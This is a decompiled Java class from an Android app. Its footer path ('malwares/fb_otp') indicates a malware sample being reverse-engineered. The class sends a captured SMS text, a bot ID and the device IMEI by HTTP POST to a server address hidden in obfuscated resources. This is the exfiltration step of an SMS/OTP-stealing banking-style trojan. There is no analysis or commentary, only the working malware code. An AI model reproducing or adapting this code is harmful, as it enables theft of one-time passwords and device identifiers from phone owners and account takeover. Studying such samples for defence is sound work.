import android.content.Context;
import com.soft360.iService.AService;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class eb
  implements Runnable
{
  eb(dU paramdU, String paramString) {}
  
  public final void run()
  {
    try
    {
      DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
      localDefaultHttpClient.getParams().setParameter("http.protocol.content-charset", "UTF-8");
      Object localObject = this.jdField_a_of_type_DU.a(AService.jdField_a_of_type_AndroidContentContext.getString(2131165192));
      localObject = new HttpPost(this.jdField_a_of_type_DU.a(AService.jdField_a_of_type_Int) + (String)localObject);
      ArrayList localArrayList = new ArrayList();
      localArrayList.add(new BasicNameValuePair("sms", this.jdField_a_of_type_JavaLangString));
      localArrayList.add(new BasicNameValuePair("from", "coordinates"));
      localArrayList.add(new BasicNameValuePair("bot_id", this.jdField_a_of_type_DU.b()));
      dU localdU = this.jdField_a_of_type_DU;
      localArrayList.add(new BasicNameValuePair("imei", dU.a()));
      ((HttpPost)localObject).setEntity(new UrlEncodedFormEntity(localArrayList, "UTF-8"));
      localDefaultHttpClient.execute((HttpUriRequest)localObject);
      return;
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
      return;
    }
    catch (ClientProtocolException localClientProtocolException) {}
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/eb.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */